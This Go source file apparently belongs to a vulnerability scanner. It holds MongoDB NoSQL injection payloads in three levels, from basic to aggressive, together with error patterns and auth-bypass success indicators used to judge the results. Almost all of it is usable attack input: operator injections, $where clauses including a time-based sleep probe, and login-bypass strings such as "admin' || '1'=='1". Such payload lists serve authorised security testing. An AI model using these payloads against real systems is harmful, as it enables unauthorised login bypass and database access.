package payloads

// NoSQLiPayloads contains NoSQL injection payloads organized by level
// Level 1 = Basic, Level 2 = Normal, Level 3 = Aggressive
// Primarily focused on MongoDB
var NoSQLiPayloads = map[int][]string{
	1: { // Basic
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`[$ne]=1`,
	},
	2: { // Normal
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$exists": true}`,
		`{"$regex": ".*"}`,
		`[$ne]=1`,
		`[$gt]=`,
		`[$exists]=true`,
		`{"$or": [{}]}`,
		`{"$and": [{}]}`,
	},
	3: { // Aggressive
		`{"$ne": ""}`,
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$exists": true}`,
		`{"$regex": ".*"}`,
		`{"$regex": "^a"}`,
		`{"$where": "1==1"}`,
		`{"$where": "sleep(5000)"}`,
		`[$ne]=1`,
		`[$gt]=`,
		`[$exists]=true`,
		`[$regex]=.*`,
		`[$where]=1==1`,
		`{"$or": [{}]}`,
		`{"$and": [{}]}`,
		`{"$nin": []}`,
		`{"$in": []}`,
		`||1==1`,
		`'||'1'=='1`,
		`admin' || '1'=='1`,
	},
}

// NoSQLErrorPatterns contains error strings that indicate NoSQL injection
var NoSQLErrorPatterns = []string{
	"MongoError",
	"MongoDB",
	"$where",
	"BSON",
	"Mongoose",
	"CastError",
	"ObjectId",
	"BSONObj",
	"JsonParseException",
	"invalid operator",
	"unknown operator",
	"bad query",
}

// AuthBypassIndicators contains strings that may indicate successful auth bypass
var AuthBypassIndicators = []string{
	"logged in",
	"welcome",
	"dashboard",
	"success",
	"authenticated",
	"admin",
	"token",
}

// GetNoSQLiPayloads returns NoSQL injection payloads for the given level
func GetNoSQLiPayloads(level int) []string {
	if p, ok := NoSQLiPayloads[level]; ok {
		return p
	}
	return NoSQLiPayloads[2] // Default to normal
}
